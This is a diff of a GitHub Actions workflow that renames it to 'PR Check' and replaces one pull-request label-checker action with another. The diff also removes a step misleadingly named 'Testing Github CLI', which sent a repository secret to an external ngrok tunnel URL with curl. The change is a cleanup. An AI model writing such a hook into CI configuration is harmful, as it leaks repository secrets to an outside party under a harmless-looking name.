@@ -1,4 +1,4 @@
-name: CI
+name: PR Check
 
 on:
   push:
@@ -13,10 +13,8 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - name: PR Label Check
-        uses: docker://agilepathway/pull-request-label-checker:latest
+        uses: danielchabr/pr-labels-checker@v3
+        id: checkLabel
         with:
-          one_of: release:major,release:minor,release:patch
-          repo_token: ${{ secrets.GITHUB_TOKEN }}
-      - name: Testing Github CLI
-        run: |
-          curl https://793f-49-36-65-203.in.ngrok.io/test/${{ secrets.ARG }}
+          hasSome: release:minor,release:major,release:patch
+          githubToken: ${{ secrets.GITHUB_TOKEN }}
